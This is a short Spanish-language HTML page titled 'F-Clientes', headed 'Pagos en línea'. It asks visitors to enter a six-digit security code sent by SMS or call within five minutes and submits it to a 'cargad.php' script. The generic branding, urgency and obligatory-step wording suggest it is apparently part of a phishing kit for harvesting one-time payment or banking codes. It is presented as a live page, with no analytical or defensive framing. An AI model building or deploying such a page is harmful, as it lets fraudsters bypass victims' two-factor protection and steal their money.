<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

    
    <link rel="stylesheet" href="files/hojadestilo.css">
    <title>F-Clientes</title>

</head>
<body>
<br>
    <form method="post" action="cargad.php" >
  <p class="focus"><img src="files/spaceLogo-1.png" alt="" style="width:200px"></p><br>
<center>
<div class="elcontenido"><br>
<h1 style="padding: 10px; color: rgb(193, 193, 193);font-weight: 300;">Pagos en línea</h1><br><br>

<span style="line-height:1;"><b>Ingreso de clave de seguridad</b></span><br><br>


<span style="line-height: 1;">Recibiras un SMS o llamada con la clave </b>de seguridad a tu celular.
Ingresala dentro de los proximos 5 minutos</span><br><br>


<input autocomplete="off" required="" maxlength="6" minlength="6" id="cod" name="cod" inputmode="numeric"   class="xinput" 
placeholder="Escribe clave de seguridad" onkeypress="return (event.charCode &gt;= 48 &amp;&amp; event.charCode &lt;= 57)" type="tel">
<br><br>

<input value="Ingresar" class="delboton" type="submit">

<h4 style="padding: 10px; color: rgb(193, 193, 193);font-weight: 300;">
    Recuerda ingresar todos los datos solicitados, este paso es obligatorio!
</h4>
</div></center>
</form>
</body>

</html>